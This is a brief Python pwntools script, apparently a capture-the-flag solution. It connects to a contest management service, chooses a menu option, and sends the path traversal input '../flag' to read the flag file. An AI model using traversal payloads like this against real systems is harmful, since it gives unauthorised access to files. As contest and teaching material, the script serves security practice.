#!/usr/bin/env python


from pwn import *

context.log_level = 'critical'  #so we dont see msg about open and close conn in the terminal

conn = 'mngmnt-iface.ctfcompetition.com'
port = 1337

s = remote(conn, port)

s.recv()
s.recv()
s.sendline("2")
s.recv()
s.recv()
s.sendline("../flag")
print s.recv()

s.close()